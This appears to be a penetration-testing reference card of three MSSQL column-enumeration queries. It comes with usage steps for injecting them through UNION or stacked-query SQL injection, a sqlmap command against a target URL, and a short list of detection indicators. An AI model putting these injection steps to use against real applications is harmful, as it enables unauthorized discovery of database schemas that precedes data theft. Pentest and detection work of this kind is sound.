---
type: code
language: sql
verified: true
tags:
  - sql-injection
  - mssql
  - discovery
  - schema-enumeration
platforms:
  - MSSQL
validated: true
---

# mssql-column-enumeration-queries

## Code

```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = '$_TABLE_NAME'); -- for the current DB only
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='$_TABLE_NAME'; -- list column names and types for master..$_TABLE_NAME

SELECT table_catalog, column_name FROM information_schema.columns
```

## Description

This SQL code snippet contains three queries for enumerating column information in an MSSQL database via injection. The first lists column names for a table in the current database, the second provides names and types from the master database, and the third maps all columns across catalogs. It serves as a reference for building SQLi payloads to discover database schema during offensive security assessments.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_TABLE_NAME | Name of the target table for the first two queries | 'users' or 'sometable' |

## Usage

Inject these queries into vulnerable web application parameters (e.g., via UNION SELECT or stacked queries) after confirming SQLi. For example, append to a search input: ' UNION [query] --. Use tools like sqlmap for automation: sqlmap -u "http://target/search?q=1" --dbms=mssql --schema. The first two queries require a known table name from prior enumeration (e.g., via table listing), while the third provides broad discovery.

## Detection

- Database query logs showing access to syscolumns, sysobjects, or information_schema.columns from untrusted sources.
- WAF alerts on SQL keywords like 'syscolumns', 'xtype', or 'information_schema' in inputs.
- Anomalous response times or error messages leaking schema details in application logs.
- Network traffic analysis for repeated probing of database endpoints.

## Related

- [[procedures/List-MSSQL-Table-Columns-via-SQL-Injection]]
- [[commands/mssql-list-column-names-for-table]]
